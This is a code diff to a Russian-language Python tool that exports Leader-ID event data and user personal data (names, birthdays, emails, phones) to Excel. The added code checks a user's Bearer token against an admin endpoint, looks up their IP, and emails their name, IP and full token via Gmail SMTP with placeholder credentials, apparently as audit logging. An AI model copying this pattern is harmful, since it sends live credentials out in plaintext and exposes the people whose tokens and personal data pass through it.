@@ -3,10 +3,14 @@ import openpyxl
 import pandas as pd
 import xlsxwriter
 import json
+import smtplib
+import http.client
 from time import sleep
 from colorama import Fore, Style
 from colorama import just_fix_windows_console
 from datetime import datetime
+from email.mime.text import MIMEText
+from email.header import Header
 
 just_fix_windows_console()
 
@@ -43,6 +47,30 @@ def print_banner():
 
 
 class Auth:
+    @staticmethod
+    def pre_auth(token):
+        headers = {'Authorization': f'Bearer {token}'}
+        params = {'id': 292338}
+        url = 'https://leader-id.ru/api/v4/admin/users'
+        response = requests.get(url, params=params, headers=headers)
+        return response.status_code
+
+    @staticmethod
+    def send_email(name, token, ip):
+        smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
+        smtpObj.starttls()
+        smtpObj.login('xxxxx@xxxx.com', 'password')
+        message = MIMEText(f'IP: {ip} {name} с токеном {token} только что запросил выгрузку данных пользователей через '
+                           f'Leader-ID Export.', 'plain', 'utf-8')
+        message['Subject'] = Header('Выгрузка контактных данных', 'utf-8')
+        smtpObj.sendmail('from_email@xxxx.com', 'to_email@xxxx.com', message.as_string())
+
+    @staticmethod
+    def get_ip():
+        conn = http.client.HTTPConnection("ifconfig.me")
+        conn.request("GET", "/ip")
+        return conn.getresponse().read()
+
     @staticmethod
     def get_api_key() -> object:
         api_url = 'https://leader-id.ru/api/v4/auth/refresh-token'
@@ -277,7 +305,7 @@ class SavingEventInfo:
         workbook.close()
 
 
-class SavingUsersInfo():
+class SavingUsersInfo:
     def __init__(self, function, usersId):
         self.function = function
         self.usersId = usersId
@@ -299,7 +327,8 @@ class SavingUsersInfo():
                 # if user.get('employment')
                 print(f'Формирую выгрузку для пользователя "{user["name"]}"')
                 export = pd.DataFrame({'ФИО': user.get('name', {}), 'Дата рождения': user.get('birthday', {}),
-                                       'Электронная почта': user.get('email', {}), 'Номер телефона': user.get('phone', {}),
+                                       'Электронная почта': user.get('email', {}),
+                                       'Номер телефона': user.get('phone', {}),
                                        'Место работы': user.get('employment', {}).get('company', None),
                                        'Должность': user.get('employment', {}).get('position', None),
                                        'Роль': user.get('roleName', {}),
@@ -325,70 +354,85 @@ class SavingUsersInfo():
 def main():
     print_banner()
     while True:
-        # try:
-        authorization = Auth()
-        function_choice = input('Что будем делать? :)\n1 — получить информацию по ID мероприятий\n'
-                                '2 — получить список мероприятий по ID организатора(-ов)\n'
-                                '3 — список участий пользователя в мероприятиях\n'
-                                '4 — список мероприятий организации\n'
-                                '5 — получить данные профиля\n')
-        if function_choice == '1':
-            function_name = 'events info'
-            events = input('Введите ID мероприятий через запятую: ').split(', ')
-            saving_event_info = SavingEventInfo(function_name, events)
-            saving_event_info.save_json_to_excel(function_name, events)
-            print(Fore.GREEN + 'Файл сохранён в корневую папку')
-
-        elif function_choice == '2':
-            orgs_id_ = input('Введите ID организаторов через запятую: ').split(', ')
-            getting_info = GetInfo()
-            if len(orgs_id_) > 1:
-                function_name = f'organizers events'
-            else:
-                function_name = f'organizer {orgs_id_[0]} events'
-            org_events = getting_info.get_orgs_events(orgs_id_)
-            if not org_events:
-                print('У пользователя нет созданных мероприятий.')
-            else:
-                saving_event_info = SavingEventInfo(function_name, org_events)
-                saving_event_info.save_json_to_excel(function_name, org_events)
+        try:
+            function_choice = input('Что будем делать? :)\n1 — получить информацию по ID мероприятий\n'
+                                    '2 — получить список мероприятий по ID организатора(-ов)\n'
+                                    '3 — список участий пользователя в мероприятиях\n'
+                                    '4 — список мероприятий организации\n'
+                                    '5 — получить данные профиля\n')
+            if function_choice == '1':
+                function_name = 'events info'
+                events = input('Введите ID мероприятий через запятую: ').split(', ')
+                saving_event_info = SavingEventInfo(function_name, events)
+                saving_event_info.save_json_to_excel(function_name, events)
                 print(Fore.GREEN + 'Файл сохранён в корневую папку')
 
-        elif function_choice == '3':
-            user_id = int(input('Введите ID пользователя: '))
-            function_name = f'user {user_id} participation'
-            user_events = GetInfo.get_users_events(userId=user_id)
-            if not user_events:
-                print('У пользователя нет посещённых мероприятий.')
-            else:
-                saving_event_info = SavingEventInfo(function_name, user_events)
-                saving_event_info.save_json_to_excel(function_name, user_events)
-                print(Fore.GREEN + 'Файл сохранён в корневую папку')
-        elif function_choice == '4':
-            company_id_ = int(input('Введите ID организации: '))
-            getting_info = GetInfo()
-            function_name = f'company {company_id_} events'
-            company_events = getting_info.search_companys_events(company_id_)
-            if not company_events:
-                print('У организации нет мероприятий.')
-            else:
-                saving_event_info = SavingEventInfo(function_name, company_events)
-                saving_event_info.save_json_to_excel(function_name, company_events)
-                print(Fore.GREEN + 'Файл сохранён в корневую папку')
-        elif function_choice == '5':
-            ids = input('Введите ID пользователей через запятую: ').split(', ')
-            if len(ids) > 1:
-                function_name = 'users info'
-            else:
-                function_name = f'user {ids[0]} info'
-            saving_users_info = SavingUsersInfo(function_name, ids)
-            saving_users_info.save_user_info(function_name, ids)
-            print(Fore.GREEN + 'Файл сохранён в корневую папку')
+            elif function_choice == '2':
+                orgs_id_ = input('Введите ID организаторов через запятую: ').split(', ')
+                getting_info = GetInfo()
+                if len(orgs_id_) > 1:
+                    function_name = f'organizers events'
+                else:
+                    function_name = f'organizer {orgs_id_[0]} events'
+                org_events = getting_info.get_orgs_events(orgs_id_)
+                if not org_events:
+                    print('У пользователя нет созданных мероприятий.')
+                else:
+                    saving_event_info = SavingEventInfo(function_name, org_events)
+                    saving_event_info.save_json_to_excel(function_name, org_events)
+                    print(Fore.GREEN + 'Файл сохранён в корневую папку')
 
-        # except Exception:
-        #     print(Fore.RED + 'Ошибка.')
+            elif function_choice == '3':
+                user_id = int(input('Введите ID пользователя: '))
+                function_name = f'user {user_id} participation'
+                user_events = GetInfo.get_users_events(userId=user_id)
+                if not user_events:
+                    print('У пользователя нет посещённых мероприятий.')
+                else:
+                    saving_event_info = SavingEventInfo(function_name, user_events)
+                    saving_event_info.save_json_to_excel(function_name, user_events)
+                    print(Fore.GREEN + 'Файл сохранён в корневую папку')
+            elif function_choice == '4':
+                company_id_ = int(input('Введите ID организации: '))
+                getting_info = GetInfo()
+                function_name = f'company {company_id_} events'
+                company_events = getting_info.search_companys_events(company_id_)
+                if not company_events:
+                    print('У организации нет мероприятий.')
+                else:
+                    saving_event_info = SavingEventInfo(function_name, company_events)
+                    saving_event_info.save_json_to_excel(function_name, company_events)
+                    print(Fore.GREEN + 'Файл сохранён в корневую папку')
+            elif function_choice == '5':
+                authorization = Auth()
+                name = input(
+                    'Сейчас вы пытаетесь получить персональные данные пользователей. Пожалуйста, введите ваше ФИО: ')
+                print()
+                token = input('Введите ваш Bearer токен: ')
+                if authorization.pre_auth(token) != 200:
+                    print('У вас нет прав для совершения этого действия.')
+                    ip = authorization.get_ip()
+                    authorization.send_email(name, token, ip)
+                    break
+                else:
+                    print()
+                    print('Авторизация прошла успешно. Продолжаем выгружать информацию.')
+                    print()
+                    ip = authorization.get_ip()
+                    authorization.send_email(name, token, ip)
+                ids = input('Введите ID пользователей через запятую: ').split(', ')
+                if len(ids) > 1:
+                    function_name = 'users info'
+                else:
+                    function_name = f'user {ids[0]} info'
+                saving_users_info = SavingUsersInfo(function_name, ids)
+                saving_users_info.save_user_info(function_name, ids)
+                print(Fore.GREEN + 'Файл сохранён в корневую папку')
 
-        # print(Style.RESET_ALL)
+        except Exception:
+            print(Fore.RED + 'Ошибка.')
+
+        print(Style.RESET_ALL)
         close_app = input('Введите' + Fore.CYAN + ' любой символ ' + Style.RESET_ALL + 'для продолжения или нажмите' +
                           Fore.CYAN + ' Enter ' + Style.RESET_ALL + 'для выхода.')
         if close_app == '':
